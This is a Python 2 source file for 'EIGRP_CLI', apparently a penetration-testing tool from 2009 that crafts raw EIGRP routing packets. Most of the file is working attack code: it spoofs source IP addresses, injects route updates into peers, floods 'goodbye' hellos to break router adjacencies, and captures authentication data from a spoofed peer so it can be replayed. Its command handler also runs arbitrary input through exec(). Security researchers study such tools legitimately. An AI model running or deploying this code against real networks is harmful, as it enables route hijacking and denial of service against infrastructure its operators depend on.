#! /usr/bin/env python

#       eigrp_cli.py
#       
#       Copyright 2009 Daniel Mende <dmende@ernw.de>
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


import os
import sys
import signal
import threading
import socket
import struct
import time
import cmd
import fcntl
import md5

import pcap
import dpkt

EIGRP_CLI_VERSION = "0.1.3"

EIGRP_PROTOCOL_NUMBER = 0x58
EIGRP_MULTICAST_ADDRESS = "224.0.0.10"

DEFAULT_HOLD_TIME = 5

SO_BINDTODEVICE	= 25

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24]

def ichecksum_func(data, sum=0):
    ''' Compute the Internet Checksum of the supplied data.  The checksum is
    initialized to zero.  Place the return value in the checksum field of a
    packet.  When the packet is received, check the checksum, by passing
    in the checksum field of the packet and the data.  If the result is zero,
    then the checksum has not detected an error.
    '''
    # make 16 bit words out of every two adjacent 8 bit words in the packet
    # and add them up
    for i in xrange(0,len(data),2):
        if i + 1 >= len(data):
            sum += ord(data[i]) & 0xFF
        else:
            w = ((ord(data[i]) << 8) & 0xFF00) + (ord(data[i+1]) & 0xFF)
            sum += w

    # take only 16 bits out of the 32 bit sum and add up the carries
    while (sum >> 16) > 0:
        sum = (sum & 0xFFFF) + (sum >> 16)

    # one's complement the result
    sum = ~sum

    return sum & 0xFFFF

class eigrp_address:
    def __init__(self, addr, len=4):
        self.addr = socket.inet_aton(addr)
        self.len = len

    def render(self):
        return self.addr + struct.pack("!B", self.len)

class eigrp_packet:
    EIGRP_VERSION = 2
    EIGRP_OPTCODE_UPDATE = 1
    EIGRP_OPTCODE_RESERVED = 2
    EIGRP_OPTCODE_QUERY = 3
    EIGRP_OPTCODE_REPLY = 4
    EIGRP_OPTCODE_HELLO = 5
    EIGRP_FLAGS_INIT = 0x00000001
    EIGRP_FLAGS_COND_RECV = 0x00000008
        
    def __init__(self, optcode = None, flags = None, seq_num = None, ack_num = None, as_num = None, data = None):
        self.optcode = optcode
        self.checksum = 0
        self.flags = flags
        self.seq_num = seq_num
        self.ack_num = ack_num
        self.as_num = as_num
        self.data = data

    def parse(self, data):
        payload = data[20:]
        self.optcode, self.checksum, self.flags, self.seq_num, self.ack_num, self.as_num = struct.unpack("!xBHIIII", data[:20])
        return payload

    def render(self):
        data = ""
        auth = None
        auth_pos = None
        if self.data:
            for i in self.data:
                if i.__class__ == eigrp_authentication:
                    auth = i
                    auth_pos = len(data)
                else:
                    data += i.render()
            if auth:
                #data = data[0:auth_pos] + auth.render(struct.pack("!BBHIIII", self.EIGRP_VERSION, self.optcode, self.checksum, self.flags, self.seq_num, self.ack_num, self.as_num) + data) + data[auth_pos:]
                data = data[0:auth_pos] + auth.render(struct.pack("!BIII", self.optcode, self.as_num, self.flags, self.seq_num) ) + data[auth_pos:]
                #data = data[0:auth_pos] + auth.render(data) + data[auth_pos:]
        ret = struct.pack("!BBHIIII", self.EIGRP_VERSION, self.optcode, self.checksum, self.flags, self.seq_num, self.ack_num, self.as_num)
        self.checksum = ichecksum_func(ret + data)
        return struct.pack("!BBHIIII", self.EIGRP_VERSION, self.optcode, self.checksum, self.flags, self.seq_num, self.ack_num, self.as_num) + data

class eigrp_tlv:
    EIGRP_TYPE_PARAM = 0x0001
    EIGRP_TYPE_AUTH = 0x0002
    EIGRP_TYPE_SEQENCE = 0x0003
    EIGRP_TYPE_VERSION = 0x0004
    EIGRP_TYPE_NEXT_MULTICAST_SEQ = 0x0005
    EIGRP_TYPE_INTERNAL_ROUTE = 0x0102
    EIGRP_TYPE_EXTERNAL_ROUTE = 0x0103
    
    def __init__(self, type=None):
        self.type = type
        self.len = None
        self.data = None

    def parse(self, data):
        self.type, self.len = struct.unpack("!HH", data[:4])
        self.data = data[4:self.len]
        if self.len >= len(data):
            return False
        else:
            return data[self.len:]

    def render(self, data=None):
        if data and not self.data:
            return struct.pack("!HH", self.type, len(data) + 4) + data
        if not data and self.data:
            return struct.pack("!HH", self.type, self.len) + self.data

class eigrp_param(eigrp_tlv):
    def __init__(self, k1, k2, k3, k4, k5, hold_time):
        eigrp_tlv.__init__(self, eigrp_tlv.EIGRP_TYPE_PARAM)
        self.k1 = k1
        self.k2 = k2
        self.k3 = k3
        self.k4 = k4
        self.k5 = k5
        self.hold_time = hold_time

    def render(self):
        return eigrp_tlv.render(self, struct.pack("!BBBBBxH", self.k1, self.k2, self.k3, self.k4, self.k5, self.hold_time))

class eigrp_authentication(eigrp_tlv):
    def __init__(self, key, hash="md5", key_id = 1):
        eigrp_tlv.__init__(self, eigrp_tlv.EIGRP_TYPE_AUTH)
        self.key = key
        self.hash = hash
        self.key_id = key_id

    def render(self, data):
        if self.hash == "md5":
            m = md5.new()
            m.update(data)
            m.update(self.key)
            return eigrp_tlv.render(self, struct.pack("!4BI12B", 0x00, 0x02, 0x00, 0x10, self.key_id, 0x00, 0x00, 0x00, 0x00 ,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) + m.digest())
        else:
            return ""

class eigrp_sequence(eigrp_tlv):
    def __init__(self, addr):
        eigrp_tlv.__init__(self, eigrp_tlv.EIGRP_TYPE_SEQENCE)
        self.addr = addr

    def render(self):
        return eigrp_tlv.render(self, addr.render())

class eigrp_next_multicast_seq(eigrp_tlv):
    def __init__(self, seq):
        eigrp_tlv.__init__(self, eigrp_tlv.EIGRP_TYPE_NEXT_MULTICAST_SEQ)
        self.seq = seq

    def render(self):
        return eigrp_tlv.render(self, struct.pack("!I", self.seq))

class eigrp_version(eigrp_tlv):
    def __init__(self, ios_ver=0xc04, eigrp_ver=0x102):
        eigrp_tlv.__init__(self, eigrp_tlv.EIGRP_TYPE_VERSION)
        self.ios_ver = ios_ver
        self.eigrp_ver = eigrp_ver

    def render(self):
        return eigrp_tlv.render(self, struct.pack("!HH", self.ios_ver, self.eigrp_ver))

class eigrp_internal_route(eigrp_tlv):
    def __init__(self, next_hop, delay, bandwidth, mtu, hop_count, reliability, load, prefix, dest):
        eigrp_tlv.__init__(self, eigrp_tlv.EIGRP_TYPE_INTERNAL_ROUTE)
        self.next_hop = socket.inet_aton(next_hop)
        self.delay = delay
        self.bandwidth = bandwidth
        self.mtu = mtu
        self.hop_count = hop_count
        self.reliability = reliability
        self.load = load
        self.prefix = prefix
        self.dest = socket.inet_aton(dest)

    def render(self):
        mtu_and_hop = (self.mtu << 8) + self.hop_count
        dest = ""
        for x in xrange(0, self.prefix / 8):
            dest += self.dest[x:x+1]
        return eigrp_tlv.render(self, self.next_hop + struct.pack("!IIIBBxxB", self.delay, self.bandwidth, mtu_and_hop, self.reliability, self.load, self.prefix) + dest)

class eigrp_external_route(eigrp_tlv):
    EIGRP_EXTERNAL_PROTO_OSPF = 6
    
    def __init__(self, next_hop, originating_router, originating_as, arbitrary_tag, external_metric, external_proto, flags, delay, bandwidth, mtu, hop_count, reliability, load, prefix, dest):
        eigrp_tlv.__init__(self, eigrp_tlv.EIGRP_TYPE_EXTERNAL_ROUTE)
        self.next_hop = socket.inet_atoi(next_hop)
        self.originating_router = socket.inet_atoi(originating_router)
        self.originating_as = originating_as
        self.arbitrary_tag = arbitrary_tag
        self.external_metric = external_metric
        self.external_proto = external_proto
        self.flags = flags
        self.delay = delay
        self.bandwidth = bandwidth
        self.mtu = mtu
        self.hop_count = hop_count
        self.reliability = reliability
        self.load = load
        self.prefix = prefix
        self.dest = socket.inet_atoi(dest)

    def render(self):
        mtu_and_hop = (self.mtu << 8) + self.hop_count
        dest = ""
        for x in xrange(0, self.prefix / 8):
            dest += self.dest[x:x+1]
        return eigrp_tlv.render(self, self.next_hop + self.originating_router + struct.pack("!IIIIxxBBIIIBBxxB", self.originating_as, self.arbitrary_tag, self.external_metric, self.external_proto, self.flags, self.delay, self.bandwidth, mtu_and_hop, self.reliability, self.load, self.prefix) + dest)

class eigrp_hello_thread(threading.Thread):
    def __init__(self, interface, as_num, auth=None, spoof=None):
        threading.Thread.__init__(self)
        self.interface = interface
        self.running = True
        self.sock = None
        self.as_num = as_num
        self.auth = auth
        self.spoof = spoof

    def hello(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, EIGRP_PROTOCOL_NUMBER)
        self.sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, self.interface)
        if self.spoof:
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while self.running:
            params = eigrp_param(1, 0, 1, 0, 0, 15)
            version = eigrp_version() #(0xc02, 0x300)
            args = [params, version]
            if self.auth:
                args.insert(0, self.auth)
            msg = eigrp_packet(eigrp_packet.EIGRP_OPTCODE_HELLO, 0, 0, 0, self.as_num, args)
            data = msg.render()
            if not self.spoof:
                self.sock.sendto(data, (EIGRP_MULTICAST_ADDRESS,0))
            else:
                ip = struct.pack("!BBHHHBBH", 0x45, 0xc0, len(data) + 20, 0x0000, 0x0000, 0x02, EIGRP_PROTOCOL_NUMBER, 0x0000) + self.spoof + socket.inet_aton(EIGRP_MULTICAST_ADDRESS)
                ip = ip[:10] + struct.pack("!H", ichecksum_func(ip)) + ip[12:]
                self.sock.sendto(ip + data, (EIGRP_MULTICAST_ADDRESS,0))
            time.sleep(DEFAULT_HOLD_TIME)
        self.sock.close()

    def run(self):
        self.hello()
        print "Hello thread terminated"
        #interface.hello_thread = None

    def quit(self):
        self.running = False
        self.join()

class eigrp_listener(threading.Thread):
    def __init__(self, interface, as_num, address, listen_for_auth=False):
        threading.Thread.__init__(self)
        self.running = True
        self.pcap = pcap.pcap(name=interface)
        self.pcap.setfilter("ip proto eigrp")
        self.address = address
        self.interface = interface
        self.as_num = as_num
        self.listen_for_auth = listen_for_auth
        
    def listen(self):
        for ts, pkt in self.pcap:
            if self.running:
                eth = dpkt.ethernet.Ethernet(pkt)
                data = str(eth.data)
                ip = dpkt.ip.IP(data)
                if ip.dst == socket.inet_aton("224.0.0.10"):
                    if not ip.src == self.address:
                        self.disp_multicast(ip.data, ip.src)
                    if self.listen_for_auth and ip.src == self.address:
                        self.disp_auth(ip.data)
                elif ip.dst == self.address:
                    self.disp_unicast(ip.data, ip.src)
            else:
                return

    def disp_auth(self, data):
        packet = eigrp_packet()
        payload = packet.parse(data)
        if packet.optcode == eigrp_packet.EIGRP_OPTCODE_HELLO:
            tlv = eigrp_tlv()
            while True:
                payload = tlv.parse(payload)
                if tlv.type == eigrp_tlv.EIGRP_TYPE_AUTH:
                    interface.auth = tlv
                    print "Got authentication data from " + socket.inet_ntoa(self.address)
                    self.running = False
                    break
                if not payload:
                    break

    def disp_multicast(self, data, src):
        #print "disp_multicast from " + socket.inet_ntoa(src)
        pass
        
    def disp_unicast(self, data, src):
        #print "disp_unicast from " + socket.inet_ntoa(src)
        if src not in interface.peers:
            interface.add_peer(src, data)
        else:
            interface.peers[src].input(data)

    def run(self):
        self.listen()
        print "Listen thread terminated"
        interface.listen_thread = None

    def quit(self):
        self.running = False
        #self.join()

class eigrp_peer(threading.Thread):
    def __init__(self, interface, peer, as_num, holdtime, auth=None, spoof=None):
        threading.Thread.__init__(self)
        self.sem = threading.Semaphore()
        self.interface = interface
        self.peer = peer
        self.as_num = as_num
        self.holdtime = holdtime
        self.sock = None
        self.msg = None
        #self.msg = eigrp_packet(eigrp_packet.EIGRP_OPTCODE_UPDATE, eigrp_packet.EIGRP_FLAGS_INIT, 0, 0, 1, [])
        self.running = True
        self.seq_num = 0
        self.auth = auth
        self.spoof = spoof

    def send(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, EIGRP_PROTOCOL_NUMBER)
        self.sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, self.interface)
        if self.spoof:
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while self.running:
            self.sem.acquire()
            if self.msg:
                if self.auth:
                    self.msg.data.insert(0, self.auth)
                if not self.msg.optcode == eigrp_packet.EIGRP_OPTCODE_HELLO:
                    self.msg.seq_num = self.seq_num
                    self.seq_num += 1
                try:
                    data = self.msg.render()
                except:
                    print "Error while sending msg. Check arguments."
                else:
                    if not self.spoof:
                        self.sock.sendto(data, (socket.inet_ntoa(self.peer),0))
                    else:
                        ip = struct.pack("!BBHHHBBH", 0x45, 0xc0, len(data) + 20, 0x0000, 0x0000, 0x02, EIGRP_PROTOCOL_NUMBER, 0x0000) + self.spoof + self.peer
                        ip = ip[:10] + struct.pack("!H", ichecksum_func(ip)) + ip[12:]
                        self.sock.sendto(ip + data, (socket.inet_ntoa(self.peer),0))
                self.msg = None
            self.sem.release()
            time.sleep(self.holdtime)
        self.sock.close()

    def input(self, data):
        packet = eigrp_packet()
        payload = packet.parse(data)
        if not packet.optcode == eigrp_packet.EIGRP_OPTCODE_HELLO:
            reply = eigrp_packet(eigrp_packet.EIGRP_OPTCODE_HELLO, 0, 0, packet.seq_num, self.as_num)
            self.sem.acquire()
            self.msg = reply
            self.sem.release()

    def update(self, msg):
        self.sem.acquire()
        self.msg = msg
        self.sem.release()
        
    def run(self):
        self.send()
        print "EIGRP peer " + socket.inet_ntoa(self.peer) + " terminated"
        #del interface.peers[self.peer]

    def quit(self):
        self.running = False
        self.join()

class eigrp_interface(cmd.Cmd):
    def __init__(self):
        cmd.Cmd.__init__(self)
        self.intro = "EIGRP_CLI " + EIGRP_CLI_VERSION + " by Daniel Mende - dmende@ernw.de"
        self.prompt = "EIGRP_CLI> "
        self.interface = None
        self.as_num = None
        self.listen_thread = None
        self.hello_thread = None
        self.filter = None
        self.peers = {}
        self.address = None
        self.msg = None
        self.auth = None
        self.spoof = None

    def do_EOF(self, arg):
        self.do_exit("")
    
    def do_exit(self, args):
        print ""
        if self.listen_thread:
            self.listen_thread.quit()
        if self.hello_thread:
            self.hello_thread.quit()
        for x in interface.peers:
            interface.peers[x].quit()
        if interface.filter:
            print "Removing lokal packet filter for EIGRP"
            os.system("iptables -D INPUT -i " + self.interface + " -p " + EIGRP_PROTOCOL_NUMBER.__str__() + " -j DROP")
        print "Bye..."
        exit(1)

    def help_exit(self):
        print "Quits EIGRP_CLI"

    def emptyline(self):
        pass

    def default(self, line):       
        try:
            exec(line)
        except Exception, e:
            print e.__class__, ":", e

    def preloop(self):
        cmd.Cmd.preloop(self)
        self._hist = []
        self._locals = {}
        self._globals = {}

    def do_hist(self, args):
        print self._hist

    def help_hist(self):
        print "Prints the command history"

    def precmd(self, line):
        self._hist += [line.strip()]
        return line

    def do_interface(self, args):
        t = args.split()
        self.interface = t[0]
        try:
            self.address = get_ip_address(self.interface)
        except:
            print "Can't get address from interface."
        
    def help_interface(self):
        print "Sets the interface to operate on. ARGS: INTERFACE"

    def do_as_number(self, args):
        t = args.split()
        self.as_num = int(t[0])

    def help_as_number(self):
        print "Sets the AS number to use in EIGRP. ARGS: AS_NUMBER"

    def do_auth(self, args):
        t = args.split()
        key = "md5"
        id = 1
        if len(t) == 3:
            id = str(t[2])
        if len(t) >= 2:
            key = t[1]
        self.auth = eigrp_authentication(t[0], key)

    def help_auth(self):
        print "Sets the EIGRP authentication data. ARGS: KEY [TYPE [KEY_ID]]"

    def do_listen(self, args):
        if self.listen_thread:
            print "Allready listening"
        else:
            if self.as_num:
                if self.interface:
                    if not self.filter:
                        print "Setting lokal packet filter for EIGRP"
                        os.system("iptables -A INPUT -i " + self.interface + " -p " + EIGRP_PROTOCOL_NUMBER.__str__() + " -j DROP")
                        self.filter = True
                    if self.spoof:
                        self.listen_thread = eigrp_listener(self.interface, self.as_num, self.spoof)
                    else:
                        self.listen_thread = eigrp_listener(self.interface, self.as_num, self.address)
                    self.listen_thread.start()
                    print "Listen thread started"
                else:
                    print "Please set the interface first"
            else:
                print "Please set the AS number first"

    def help_listen(self):
        print "Starts the EIGRP Listener."

    def do_hello(self, line):
        self.hello_thread = eigrp_hello_thread(self.interface, self.as_num, self.auth, self.spoof)
        self.hello_thread.start()
        print "Hello thread started"

    def help_hello(self):
        print "Starts the EIGRP Hello Thread."

    def do_update(self, args):
        t = args.split()
        if len(t) == 1:
            try:
                peer = socket.inet_aton(t[0])
            except:
                print "Invalid peer."
            else:
                if peer in self.peers:
                    if self.msg:
                        self.peers[peer].update(self.msg)
                        self.msg = None
                else:
                    print "Peer " + t[0] + " not initialized"
        else:
            print "Wrong parameter count"

    def help_update(self):
        print "Sends a prepared EIGRP paket to a peer. ARGS: PEER"

    def add_peer(self, src, data=None, holdtime=None):
        print "Got new peer " + socket.inet_ntoa(src)
        if holdtime:
            self.peers[src] = eigrp_peer(self.interface, src, self.as_num, holdtime, self.auth, self.spoof)
        else:
            self.peers[src] = eigrp_peer(self.interface, src, self.as_num, DEFAULT_HOLD_TIME, self.auth, self.spoof)
        self.peers[src].start()
        if data:
            self.peers[src].input(data)

    def do_spoof(self, args):
        t = args.split()
        try:
            self.spoof = socket.inet_aton(t[0])
        except:
            print "Invalid IP-address."

    def help_spoof(self):
        print "Set the IP-address to spoof pakets from. ARGS: IP"

    def do_goodbye(self, args):
        t = args.split()
        try:
            addr = socket.inet_aton(t[0])
        except:
            print "Invalid peer address."
        params = eigrp_param(255, 255, 255, 255, 255, 15)
        version = eigrp_version() #(0xc02, 0x300)
        if not addr in self.peers:
            self.add_peer(addr, None, 1)
        print "Sending Goodbye messages to " + t[0]
        while self.peers[addr].running:
            sys.stdout.write(".")
            sys.stdout.flush()
            args = [params, version]
            msg = eigrp_packet(eigrp_packet.EIGRP_OPTCODE_HELLO, 0, 0, 0, self.as_num, args)
            self.peers[addr].update(msg)
            time.sleep(1)

    def help_goodbye(self):
        print "Sends EIGRP Goodbye messages to the peer. ARGS: PEER"

    def do_listen_for_auth(self, args):
        if self.listen_thread:
            print "Allready listening"
        else:
            if self.as_num:
                if self.interface:
                    if self.spoof:
                        self.listen_thread = eigrp_listener(self.interface, self.as_num, self.spoof, True)
                        self.listen_thread.start()
                        print "Listen thread started"
                        self.listen_thread.join()
                        #dont know why the hell my sighandler is gone :-S
                        signal.signal(signal.SIGINT, sigint)
                    else:
                        print "Please set the spoofed peer first"
                else:
                    print "Please set the interface first"
            else:
                print "Please set the AS number first"

    def help_listen_for_auth(self):
        print "Listens for an authenticated message to replay the authentication information."

if __name__ == '__main__':
    interface = eigrp_interface()
    
    def sigint(signum, frame):
        interface.do_exit("")
    
    signal.signal(signal.SIGINT, sigint)

    interface.cmdloop()


#TODO:
#
#Auth
#
#http://www.cisco.com/warp/public/707/cisco-sr-20051220-eigrp.shtml
